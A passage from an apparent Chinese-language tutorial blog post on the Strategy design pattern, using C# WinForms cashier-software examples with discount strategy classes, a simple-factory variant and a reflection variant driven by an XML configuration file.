punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Form1</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">double</span> total <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//用于总计</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnOk_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            CashContext cc <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>cbxType<span class="token punctuation">.</span>SelectedItem<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token comment" spellcheck="true">//直接传策略对象参数进行上下文对象的创建</span>                <span class="token keyword">case</span> <span class="token string">"正常收费"</span><span class="token punctuation">:</span>                    cc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CashNormal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"满300返100"</span><span class="token punctuation">:</span>                    cc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CashReturn</span><span class="token punctuation">(</span><span class="token string">"300"</span><span class="token punctuation">,</span> <span class="token string">"100"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"打8折"</span><span class="token punctuation">:</span>                    cc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">CashRebate</span><span class="token punctuation">(</span><span class="token string">"0.8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            <span class="token keyword">double</span> totalPrices <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//计算</span>            totalPrices <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">GetResult</span><span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtPrice<span class="token punctuation">.</span>Text<span class="token punctuation">)</span> <span class="token operator">*</span> Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtNum<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            total <span class="token operator">=</span> total <span class="token operator">+</span> totalPrices<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//显示结果</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">"单价："</span> <span class="token operator">+</span> txtPrice<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" 数量："</span> <span class="token operator">+</span> txtNum<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" "</span> <span class="token operator">+</span> cbxType<span class="token punctuation">.</span>SelectedItem <span class="token operator">+</span> <span class="token string">" 合计："</span> <span class="token operator">+</span> totalPrices<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnClear_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            total <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            txtPrice<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>            txtNum<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>测试结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/策略模式/策略模式测试结果展示.png" alt="策略模式测试结果展示"></center><h1 id="优缺点"><a href="#优缺点" class="headerlink" title="优缺点"></a>优缺点</h1><p><strong>优点</strong>：</p><ol><li>策略模式提供了<strong>管理</strong>相关<strong>算法族</strong>的办法。</li><li>策略模式提供了可以<strong>替换继承关系</strong>的办法。</li><li>使用策略模式可以<strong>避免使用多重条件转移语句</strong>。</li></ol><p><strong>缺点</strong>：</p><ol><li><strong>客户端</strong>必须<strong>知道所有的策略类</strong>，并且<strong>自行决定</strong>使用哪一个策略类</li><li>策略模式造成<strong>很多的策略类</strong>，每一个具体的策略类都会产生一个新类</li></ol><h1 id="使用场景"><a href="#使用场景" class="headerlink" title="使用场景"></a>使用场景</h1><ol><li>多个类<strong>只区别在表现行为不同</strong>，可以使用Strategy模式，在运行时动态选择具体要执行的行为；</li><li>需要在不同情况下使用不同的策略(算法),或者策略还可能在未来用其他方式来实现；</li><li>对客户隐藏具体的策略(算法)的实现细节，彼此完全独立。</li></ol><h1 id="算法改进"><a href="#算法改进" class="headerlink" title="算法改进"></a>算法改进</h1><h2 id="策略与简单工厂集合"><a href="#策略与简单工厂集合" class="headerlink" title="策略与简单工厂集合"></a>策略与简单工厂集合</h2><p>改造后的环境类：(CashContext.cs)</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//现金收取工厂</span>    <span class="token keyword">class</span> <span class="token class-name">CashContext</span>    <span class="token punctuation">{</span>        CashSuper cs <span class="token operator">=</span> <span class="token keyword">null</span><span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//根据条件返回相应的对象</span>        <span class="token keyword">public</span> <span class="token function">CashContext</span><span class="token punctuation">(</span><span class="token keyword">string</span> type<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">switch</span> <span class="token punctuation">(</span>type<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                <span class="token keyword">case</span> <span class="token string">"正常收费"</span><span class="token punctuation">:</span>                    CashNormal cs0 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashNormal</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cs <span class="token operator">=</span> cs0<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"满300返100"</span><span class="token punctuation">:</span>                    CashReturn cr1 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashReturn</span><span class="token punctuation">(</span><span class="token string">"300"</span><span class="token punctuation">,</span> <span class="token string">"100"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cs <span class="token operator">=</span> cr1<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>                <span class="token keyword">case</span> <span class="token string">"打8折"</span><span class="token punctuation">:</span>                    CashRebate cr2 <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashRebate</span><span class="token punctuation">(</span><span class="token string">"0.8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                    cs <span class="token operator">=</span> cr2<span class="token punctuation">;</span>                    <span class="token keyword">break</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">GetResult</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> cs<span class="token punctuation">.</span><span class="token function">acceptCash</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>客户端测试代码</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token comment" spellcheck="true">//策略对象的的创建在上下文类中完成，即策略对象的创建是对用户保密的</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Form1</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token comment" spellcheck="true">//客户端窗体程序（主要部分）</span>        <span class="token keyword">double</span> total <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnOk_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//利用简单工厂模式根据下拉选择框，生成相应的对象</span>            CashContext csuper <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span>cbxType<span class="token punctuation">.</span>SelectedItem<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> totalPrices <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//通过多态，可以得到收取费用的结果</span>            totalPrices <span class="token operator">=</span> csuper<span class="token punctuation">.</span><span class="token function">GetResult</span><span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtPrice<span class="token punctuation">.</span>Text<span class="token punctuation">)</span> <span class="token operator">*</span> Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtNum<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            total <span class="token operator">=</span> total <span class="token operator">+</span> totalPrices<span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//展示计价结果</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">"单价："</span> <span class="token operator">+</span> txtPrice<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" 数量："</span> <span class="token operator">+</span> txtNum<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" "</span>                <span class="token operator">+</span> cbxType<span class="token punctuation">.</span>SelectedItem <span class="token operator">+</span> <span class="token string">" 合计："</span> <span class="token operator">+</span> totalPrices<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnClear_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            total <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            txtPrice<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>            txtNum<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0"</span><span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>注</strong>：</p><ul><li>策略模式客户端需要认识<strong>CashSuper类</strong>、<strong>CashNormal类</strong>、<strong>CashReturn类</strong>、<strong>CashRebate类</strong>、<strong>CashContext类</strong>；</li><li>简单工厂模式客户端需要认识<strong>CashSuper类</strong>、<strong>工厂类</strong>；</li><li>策略与简单工厂集合之后，客户端只需要认识一个<strong>CashContext类</strong>即可，耦合度更加低。</li></ul><h2 id="策略-反射"><a href="#策略-反射" class="headerlink" title="策略 + 反射"></a>策略 + 反射</h2><p>改造后的环境类：(CashContext.cs)</p><pre class=" language-csharp"><code class="language-csharp"><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">class</span> <span class="token class-name">CashContext</span>    <span class="token punctuation">{</span>        <span class="token keyword">private</span> CashSuper cs<span class="token punctuation">;</span>        <span class="token comment" spellcheck="true">//设置上下文中的策略实例对象</span>        <span class="token keyword">public</span> <span class="token keyword">void</span> <span class="token function">setBehavior</span><span class="token punctuation">(</span>CashSuper csuper<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">this</span><span class="token punctuation">.</span>cs <span class="token operator">=</span> csuper<span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">public</span> <span class="token keyword">double</span> <span class="token function">GetResult</span><span class="token punctuation">(</span><span class="token keyword">double</span> money<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token keyword">return</span> cs<span class="token punctuation">.</span><span class="token function">acceptCash</span><span class="token punctuation">(</span>money<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>客户端测试代码</strong>：</p><pre class=" language-csharp"><code class="language-csharp"><span class="token comment" spellcheck="true">/********************************** *  * 程序说明：使用反射 + 策略模式  来实现 *  *          反射：下拉列表中的文件数据直接从配置.xml文件中获取，即在程序运行时程序才知道下拉框中会有什么内容 *          策略：使用能统一调用所有策略对象的上下文对象 *  *  */</span> <span class="token keyword">using</span> System<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Data<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Windows<span class="token punctuation">.</span>Forms<span class="token punctuation">;</span><span class="token keyword">using</span> System<span class="token punctuation">.</span>Reflection<span class="token punctuation">;</span><span class="token keyword">namespace</span> 商场管理软件<span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token keyword">partial</span> <span class="token keyword">class</span> <span class="token class-name">Form1</span> <span class="token punctuation">:</span> Form    <span class="token punctuation">{</span>        <span class="token keyword">public</span> <span class="token function">Form1</span><span class="token punctuation">(</span><span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token function">InitializeComponent</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        DataSet ds<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//用于存放配置文件信息</span>        <span class="token keyword">double</span> total <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">.</span>0d<span class="token punctuation">;</span><span class="token comment" spellcheck="true">//用于总计</span>        <span class="token comment" spellcheck="true">/// &lt;summary></span>        <span class="token comment" spellcheck="true">/// 在程序加载时，读取指定文件中的所有内容</span>        <span class="token comment" spellcheck="true">/// &lt;/summary></span>        <span class="token comment" spellcheck="true">/// &lt;param name="sender">&lt;/param></span>        <span class="token comment" spellcheck="true">/// &lt;param name="e">&lt;/param></span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">Form1_Load</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//读配置文件                     --在程序运行的路径下</span>            ds <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">DataSet</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            ds<span class="token punctuation">.</span><span class="token function">ReadXml</span><span class="token punctuation">(</span>Application<span class="token punctuation">.</span>StartupPath <span class="token operator">+</span> <span class="token string">"\\CashAcceptType.xml"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//将读取到的记录绑定到下拉列表框中</span>            <span class="token keyword">foreach</span> <span class="token punctuation">(</span>DataRowView dr <span class="token keyword">in</span> ds<span class="token punctuation">.</span>Tables<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span>DefaultView<span class="token punctuation">)</span>            <span class="token punctuation">{</span>                cbxType<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span>dr<span class="token punctuation">[</span><span class="token string">"name"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token punctuation">}</span>            cbxType<span class="token punctuation">.</span>SelectedIndex <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnOk_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            <span class="token comment" spellcheck="true">//实例化一个上下文对象</span>            CashContext cc <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">CashContext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//根据用户的选项，查询用户选择项的相关行</span>            DataRow dr <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>DataRow<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span>ds<span class="token punctuation">.</span>Tables<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">Select</span><span class="token punctuation">(</span><span class="token string">"name='"</span> <span class="token operator">+</span> cbxType<span class="token punctuation">.</span>SelectedItem<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">+</span><span class="token string">"'"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//声明一个参数的对象数组</span>            <span class="token keyword">object</span><span class="token punctuation">[</span><span class="token punctuation">]</span> args <span class="token operator">=</span><span class="token keyword">null</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//若有参数，则将其分割成字符串数组，用于实例化时所用的参数</span>            <span class="token keyword">if</span> <span class="token punctuation">(</span>dr<span class="token punctuation">[</span><span class="token string">"para"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token string">""</span><span class="token punctuation">)</span>                args <span class="token operator">=</span> dr<span class="token punctuation">[</span><span class="token string">"para"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">Split</span><span class="token punctuation">(</span><span class="token string">','</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token comment" spellcheck="true">//通过反射实例化出相应的算法对象</span>            cc<span class="token punctuation">.</span><span class="token function">setBehavior</span><span class="token punctuation">(</span><span class="token punctuation">(</span>CashSuper<span class="token punctuation">)</span>Assembly<span class="token punctuation">.</span><span class="token function">Load</span><span class="token punctuation">(</span><span class="token string">"商场管理软件"</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">CreateInstance</span><span class="token punctuation">(</span><span class="token string">"商场管理软件."</span> <span class="token operator">+</span> dr<span class="token punctuation">[</span><span class="token string">"class"</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token keyword">false</span><span class="token punctuation">,</span> BindingFlags<span class="token punctuation">.</span>Default<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> args<span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token keyword">null</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            <span class="token keyword">double</span> totalPrices <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            totalPrices <span class="token operator">=</span> cc<span class="token punctuation">.</span><span class="token function">GetResult</span><span class="token punctuation">(</span>Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtPrice<span class="token punctuation">.</span>Text<span class="token punctuation">)</span> <span class="token operator">*</span> Convert<span class="token punctuation">.</span><span class="token function">ToDouble</span><span class="token punctuation">(</span>txtNum<span class="token punctuation">.</span>Text<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            total <span class="token operator">=</span> total <span class="token operator">+</span> totalPrices<span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Add</span><span class="token punctuation">(</span><span class="token string">"单价："</span> <span class="token operator">+</span> txtPrice<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" 数量："</span> <span class="token operator">+</span> txtNum<span class="token punctuation">.</span>Text <span class="token operator">+</span> <span class="token string">" "</span><span class="token operator">+</span>cbxType<span class="token punctuation">.</span>SelectedItem<span class="token operator">+</span> <span class="token string">" 合计："</span> <span class="token operator">+</span> totalPrices<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> total<span class="token punctuation">.</span><span class="token function">ToString</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">private</span> <span class="token keyword">void</span> <span class="token function">btnClear_Click</span><span class="token punctuation">(</span><span class="token keyword">object</span> sender<span class="token punctuation">,</span> EventArgs e<span class="token punctuation">)</span>        <span class="token punctuation">{</span>            total <span class="token operator">=</span> 0d<span class="token punctuation">;</span>            txtPrice<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>            txtNum<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"1"</span><span class="token punctuation">;</span>            lbxList<span class="token punctuation">.</span>Items<span class="token punctuation">.</span><span class="token function">Clear</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>            lblResult<span class="token punctuation">.</span>Text <span class="token operator">=</span> <span class="token string">"0.00"</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></code></pre><p><strong>CashAcceptType.xml</strong>：</p><pre class=" language-xml"><code class="language-xml"><span class="token prolog">&lt;?xml version="1.0" encoding="utf-8" ?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CashAcceptType</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>正常收费<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashNormal<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>满300返100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashReturn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>300,100<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>满200返50<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashReturn<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>200,50<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>打8折<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashRebate<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>0.8<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>type</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>name</span><span class="token punctuation">></span></span>打7折<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>name</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>class</span><span class="token punctuation">></span></span>CashRebate<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>class</span><span class="token punctuation">></span></span>        <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>para</span><span class="token punctuation">></span></span>0.7<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>para</span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>type</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>CashAcceptType</span><span class="token punctuation">></span></span></code></pre><p><strong>测试结果</strong>：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/GOFDesignPattern/策略模式/策略+反射测试结果展示.png" alt="策略+反射测试结果展示"></center><h1 id="策略模式与简单工厂模式的区别"><a href="#策略模式与简单工厂模式的区别" class="headerlink" 